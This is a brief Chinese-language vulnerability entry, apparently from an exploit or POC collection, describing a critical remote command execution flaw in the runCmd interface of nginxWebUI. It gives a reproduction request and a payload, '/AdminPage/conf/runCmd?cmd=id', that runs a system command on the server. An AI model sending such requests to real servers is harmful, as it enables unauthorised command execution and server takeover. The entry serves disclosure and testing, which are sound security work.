# nginxWebUI runCmd 远程命令执行漏洞

## 漏洞描述
nginxWebUI runCmd 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取到服务器权限，执行任意命令

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面

![image-20230704113502611](images/image-20230704113502611.png)

验证请求包

```
/AdminPage/conf/runCmd?cmd=id
```


## Payloads
```
/AdminPage/conf/runCmd?cmd=id
```
